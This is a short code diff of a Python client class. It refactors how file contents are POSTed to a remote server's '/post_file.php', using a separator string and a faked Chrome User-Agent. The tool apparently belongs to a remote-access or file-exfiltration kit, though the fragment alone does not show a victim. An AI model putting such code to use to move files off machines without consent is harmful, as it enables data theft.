@@ -36,8 +36,8 @@ class Client:
             try:
                 headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'}
                 req = urllib.request.Request(url, data_to_transmit, headers)
-                f = urllib.request.urlopen(req)
-                f.close()
+                file = urllib.request.urlopen(req)
+                file.close()
                 print('[*] File sent!!!')
             except urllib.error.URLError:
                 print(f'[*] Error: Web server may not be active on {self.remote_server}')
@@ -46,9 +46,9 @@ class Client:
         else:
             url = "http://" + self.remote_server + ":" + str(self.port) + "/post_file.php"
             try:
-                data_to_transmit = self.file_transfer + ".:::-989-:::." + str(data_to_transmit)
-                f = urllib.request.urlopen(url, bytes(data_to_transmit, encoding='utf-8'))
-                f.close()
+                data_to_transmit = bytes(self.file_transfer, encoding='utf-8') + b".:::-989-:::." + data_to_transmit
+                file = urllib.request.urlopen(url, data_to_transmit)
+                file.close()
                 print('[*] File sent!!!')
             except urllib.error.URLError:
                 print(f'[*] Error: Web server may not be active on {self.remote_server}')
